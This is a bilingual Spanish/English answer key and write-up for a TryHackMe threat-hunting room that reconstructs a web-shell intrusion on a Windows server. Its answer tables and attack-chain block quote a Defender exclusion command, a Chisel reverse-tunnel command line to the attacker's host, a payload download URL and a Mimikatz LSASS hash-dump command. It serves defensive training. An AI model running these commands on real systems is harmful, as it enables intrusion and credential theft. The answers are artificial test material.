# Logless Hunt [MEDIUM]

### Información de la Sala / Room Information

* **Dificultad / Difficulty:** MEDIUM
* **Tipo / Type:** CTF (Free)
* **Slug:** `loglesshunt`
* **Link:** https://tryhackme.com/room/loglesshunt
* **Sección / Section:** SOC / Detection
* **Fuente / Source:** Writeup de thmrevenant (GitHub)

---

## Solucionario de Tareas / Task Solutions

> **ES:** Cacería de amenazas en un entorno Windows sin depender de logs tradicionales, investigando tráfico de red, procesos, tareas programadas y artefactos de seguridad para reconstruir un ataque completo.
> **EN:** Threat hunting in a Windows environment without relying on traditional logs, investigating network traffic, processes, scheduled tasks, and security artifacts to reconstruct a full attack.

---

### Task 1 — Reconocimiento e Inicial Access

| Pregunta / Question | Respuesta / Answer |
|----------|--------|
| What is the earliest Event ID you see in the Security logs? | `1102` |
| What is the title of the HR01-SRV web app hosted on 80 port? | `Salary Raise Approver v0.1` |
| Which IP performed an extensive web scan on the HR01-SRV web app? | `10.10.23.190` |
| What is the absolute path to the file that the suspicious IP uploaded? | `C:\Apache24\htdocs\uploads\search.php` |
| Clearly, that's suspicious! What would you call the uploaded malware / backdoor? | `Web Shell` |
| What was the first command entered by the attacker? | `whoami` |
| What is the full URL of the file that the attacker attempted to download? | `http://10.10.23.190:8080/httpd-proxy.exe` |

---

### Task 2 — Execution, Persistence y Lateral Movement

| Pregunta / Question | Respuesta / Answer |
|----------|--------|
| What command was run to exclude the file from Windows Defender? | `Add-MpPreference -ExclusionPath C:\Apache24` |
| Which remote access service was tunnelled using the uploaded binary? | `RDP` |
| What is the timestamp of the first suspicious RDP login? | `2025-01-23 17:00:12` |
| What user did the attacker breach? | `HR01-SRV\Administrator` |
| What IP is shown as the source of the RDP login? | `10.10.23.190` |
| What is the timestamp when the attacker disconnected from RDP? | `2025-01-23 17:16:46` |
| What is the name of the suspicious scheduled task? | `Apache Proxy` |
| When was the suspicious scheduled task created? | `2025-01-23 17:05:37` |
| What is the task's "Trigger" value as shown in Task Scheduler GUI? | `At system startup` |
| What is the full command line of the malicious task? | `C:\Apache24\bin\httpd-proxy.exe client 10.10.23.190:10443 R:3389:127.0.0.1:3389` |

---

### Task 3 — Collection y Exfiltration

| Pregunta / Question | Respuesta / Answer |
|----------|--------|
| What is the threat family ("Name") of the first quarantined file? | `VirTool:Win64/Chisel.G` |
| And what is the threat family of the next detected malware? | `HackTool:Win32/Mimikatz!pz` |
| What is the file name of the downloaded Mimikatz executable? | `mimi.exe` |
| Finally, which Mimikatz command was used to extract hashes from LSASS memory? | `lsadump::lsa /inject` |

---

## Metodología / Methodology

1. **Paso / Step:** Revisar los Security logs para identificar el Event ID más antiguo y establecer la línea de tiempo / Review Security logs to identify the earliest Event ID and establish the timeline.
2. **Paso / Step:** Investigar la aplicación web en el puerto 80 y escanear para identificar la IP atacante / Investigate the web application on port 80 and scan to identify the attacker IP.
3. **Paso / Step:** Rastrear archivos subidos por el atacante y confirmar la presencia de una web shell / Track files uploaded by the attacker and confirm the presence of a web shell.
4. **Paso / Step:** Analizar comandos ejecutados a través de la web shell y archivos descargados / Analyze commands executed through the web shell and downloaded files.
5. **Paso / Step:** Identificar exclusión de Windows Defender, túnel de RDP con Chisel y tareas programadas para persistencia / Identify Windows Defender exclusion, RDP tunneling with Chisel, and scheduled tasks for persistence.
6. **Paso / Step:** Examinar artefactos de Mimikatz y comandos de extracción de hashes / Examine Mimikatz artifacts and hash extraction commands.

### Cadena de ataque / Attack Chain

```
Escaneo web desde 10.10.23.190 contra HR01-SRV (Salary Raise Approver)
  -> Subida de web shell (search.php) en directorio de uploads
    -> Ejecución de whoami y descarga de httpd-proxy.exe (Chisel)
      -> Exclusión de Windows Defender: Add-MpPreference -ExclusionPath C:\Apache24
        -> Túnel RDP mediante Chisel (puerto 10443 -> 3389)
          -> Login RDP como HR01-SRV\Administrator
            -> Persistencia: tarea programada "Apache Proxy" (At system startup)
              -> Descarga y ejecución de Mimikatz (mimi.exe)
                -> Extracción de hashes: lsadump::lsa /inject
```

**Lección:** La cacería de amenazas sin logs tradicionales requiere correlacionar múltiples artefactos de Windows (eventos de seguridad, tareas programadas, exclusiones de Defender, procesos en memoria) para reconstruir la cadena de ataque completa. Las herramientas como Chisel y Mimikatz son indicadores clave de compromiso.

---

## ⚠️ Descargo de Responsabilidad (Disclaimer)

Este contenido se presenta exclusivamente con fines académicos y educativos.

**Sin Afiliación:** Este espacio no posee ninguna alianza, asociación, patrocinio ni vinculación oficial con TryHackMe.
**Veracidad de los Datos:** La información aquí contenida tiene un propósito ilustrativo y formativo. Los datos, políticas, precios o características de los servicios mencionados pueden variar y no son decididos por TryHackMe en este contexto.
**Referencia Oficial:** Para obtener información precisa, oficial y actualizada, se recomienda encarecidamente visitar el sitio web oficial de TryHackMe (https://tryhackme.com).
**Uso Ético:** No fomentamos ni nos responsabilizamos por el uso indebido de esta información fuera de fines educativos o profesionales legítimos.
